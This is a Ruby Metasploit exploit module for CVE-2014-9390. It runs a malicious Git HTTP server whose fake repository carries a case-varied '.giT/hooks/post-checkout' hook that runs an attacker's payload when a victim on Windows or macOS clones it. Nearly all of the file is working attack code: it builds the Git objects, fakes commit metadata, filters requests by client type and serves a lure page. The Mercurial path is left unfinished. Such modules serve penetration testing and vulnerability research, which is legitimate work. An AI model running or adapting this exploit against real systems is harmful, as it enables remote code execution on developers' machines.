##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Malicious Git HTTP Server For CVE-2014-9390',
      'Description' => %q(
        This module exploits CVE-2014-9390, which affects Git versions less
        than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 on operating systems which
        have case-insensitive file systems like Windows and OS X.  Because the
        file system is case-insensitive, sensitive files in the .git directory
        can be overwritten by other files which live in a server-side .git
        directory which only differs in case (for example, .giT).  This results
        in all manner of potential consequences, including remote code
        execution.
      ),
      'License' => MSF_LICENSE,
      'Author' => [
        'Jon Hart <jon_hart[at]rapid7.com>' # metasploit module
      ],
      'References'     =>
        [
          ['CVE', '2014-9390'],
          ['URL', 'http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html'],
          ['URL', 'https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/']
        ],
      'DisclosureDate' => 'Dec 18 2014',
      # TODO: correct all of this
      'Payload'        =>
        {
          'BadChars' => "\x00",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl bash'
            }
        },
      'Platform'	=> %w(osx win),
      'Targets'	=>
        [
          [
            'Automatic',
            {
              'Platform' => [ 'unix' ],
              'Arch'     => ARCH_CMD
            }
          ]
        ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('GIT_URI', [true, 'The URI to use as the malicious Git instance', '/git']),
        OptString.new('MERCURIAL_URI', [true, 'The URI to use as the malicious Git instance', '/hg']),
        OptString.new('URIPATH', [true, 'The URI to display the malicious repositories in', '/']),
      ]
    )

    register_advanced_options(
      [
        OptString.new('GIT_HOOK', [true, 'The Git hook to use for exploitation', 'post-checkout']),
        OptString.new('MERCURIAL_HOOK', [true, 'The Mercurial hook to use for exploitation', 'update'])
      ]
    )
  end

  def setup
    @file_paths = {}
    setup_git
    setup_mercurial
  end

  def setup_git
    # sanity check the malicious URI
    raise ArgumentError, 'GIT_URI must not be blank' if datastore['GIT_URI'].blank?
    # sanity check the malicious hook:
    raise ArgumentError, 'GIT_HOOK must not be blank' if datastore['GIT_HOOK'].blank?

    # This builds a fake git repository using the knowledge from:
    # http://schacon.github.io/gitbook/7_how_git_stores_objects.html
    # http://schacon.github.io/gitbook/7_browsing_git_objects.html
    #
    # It creates a .giT/hooks/post-checkout file that contains a command to
    # execute.  Because the full path of this file will be considered identical
    # on case-insensitive filesystems and will be use in place of
    # .git/hooks/post-checkout and will subsequently execute commands of our
    # choosing upon cloning
    # build the hook file blob
    full_cmd = "#!/bin/sh\n#{payload.encoded}"
    sha1, content = build_object('blob', full_cmd)
    @file_paths[:git] = {}
    @file_paths[:git]["/objects/#{get_path(sha1)}"] = content
    # build tree that points to the blob
    sha1, content = build_object('tree', "100755 #{datastore['GIT_HOOK']}\0#{[sha1].pack('H*')}")
    @file_paths[:git]["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the hooks directory in which the hook lives, called hooks
    sha1, content = build_object('tree', "40000 hooks\0#{[sha1].pack('H*')}")
    @file_paths[:git]["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the partially uppercased .git directory in
    # which hooks live
    variants = []
    %w(g G). each do |g|
      %w(i I).each do |i|
        %w(t T).each do |t|
          git = g + i + t
          variants << git unless git.chars.none? { |c| c == c.upcase }
        end
      end
    end
    git_dir = variants.sample
    sha1, content = build_object('tree', "40000 .#{git_dir}\0#{[sha1].pack('H*')}")
    vprint_status("Planting partially uppercased .git at .#{git_dir}")
    @file_paths[:git]["/objects/#{get_path(sha1)}"] = content
    # build the supposed commit that dropped this file
    # a random user and user name
    user = rand_text_alphanumeric(3 + rand(10)) + ' ' + rand_text_alphanumeric(3 + rand(10))
    user_name = user.downcase.gsub(/\s+/, '_')
    # random company
    company = (rand_text_alphanumeric(3 + rand(10)) + '.' + %w(com net org).sample).downcase
    # random commit and author time stamps
    tstamp = Time.now.to_i
    author_time = rand(tstamp)
    commit_time = rand(author_time)
    tz_off = rand(10)
    commit = "author #{user} <#{user_name}@#{company}> #{author_time} -0#{tz_off}00\n" \
             "committer #{user} <#{user_name}@#{company}> #{commit_time} -0#{tz_off}00\n" \
             "\n" \
             "Initial commit to open repository for #{company}!\n"
    if datastore['VERBOSE']
      vprint_status("Malicious commit is:")
      commit.each_line { |l| vprint_status(l.strip) }
    end
    sha1, content = build_object('commit', "tree #{sha1}\n#{commit}")
    @file_paths[:git]["/objects/#{get_path(sha1)}"] = content
    # build HEAD
    @file_paths[:git]['/HEAD'] = "ref: refs/heads/master\n"
    # lastly, build refs
    @file_paths[:git]['/info/refs'] = "#{sha1}\trefs/heads/master\n"
  end

  def setup_mercurial
    # sanity check the malicious URI
    raise ArgumentError, 'MERCURIAL_URI must not be blank' if datastore['MERCURIAL_URI'].blank?
    # sanity check the malicious hook:
    raise ArgumentError, 'MERCURIAL_HOOK must not be blank' if datastore['MERCURIAL_HOOK'].blank?
  end

  def build_object(type, content)
    header = "#{type} #{content.size}\0"
    store = header + content
    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
  end

  def get_path(sha1)
    sha1[0...2] + '/' + sha1[2..40]
  end

  def exploit
    super
  end

  def primer
    hardcoded_uripath(datastore['GIT_URI'])
    hardcoded_uripath(datastore['MERCURIAL_URI'])
  end

  def check_user_agent(cli, req, expected_ua_re = /^.+/)
    actual_ua = req.headers['User-Agent']
    if actual_ua
      if actual_ua =~ expected_ua_re
        true
      else
        vprint_status("Ignoring unaffected User-Agent for: #{req}")
        send_not_found(cli)
        false
      end
    else
      vprint_status("Ignoring User-Agent-less request for: #{req}")
      send_not_found(cli)
      false
    end
  end

  def on_request_uri(cli, req)
    if user_agent = req.headers['User-Agent']
      if user_agent =~ /^git\// && req.uri.start_with?(datastore['GIT_URI'])
        do_git(cli, req)
        return
      elsif user_agent =~ /^mercurial\// && req.uri.start_with?(datastore['MERCURIAL_URI'])
        do_mercurial(cli, req)
        return
      end
    end

    do_html(cli, req)
  end

  def do_git(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    req_file = URI.parse(req.uri).path.gsub(/^#{datastore['GIT_URI']}/, '')
    if @file_paths[:git].key?(req_file)
      vprint_status("Sending Git #{req_file}")
      send_response(cli, @file_paths[:git][req_file])
    else
      vprint_status("Git #{req_file} doesn't exist")
      send_not_found(cli)
    end
  end

  def do_html(cli, req)
    resp = create_response
    resp.body = <<HTML
     <html>
      <head><title>Public Repositories</title></head>
      <body>
        <p>Here are our public repositories:</p>
        <ul>
          <li><a href="#{datastore['GIT_URI']}">Git</a> (clone with `git clone #{datastore['GIT_URI']}`)</li>
          <li><a href="#{datastore['MERCURIAL_URI']}">Mercurial</a> (clone with `hg clone #{datastore['MERCURIAL_URI']}`)</li>
        </ul>
      </body>
    </html>
HTML

    cli.send_response(resp)
  end

  def do_mercurial(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    req_file = URI.parse(req.uri).path.gsub(/^#{datastore['MERCURIAL_URI']}/, '')
    if @file_paths[:mercurial].key?(req_file)
      vprint_status("Sending Mercurial #{req_file}")
      send_response(cli, @file_paths[:mercurial][req_file])
    else
      vprint_status("Mercurial #{req_file} doesn't exist")
      send_not_found(cli)
    end
  end
end
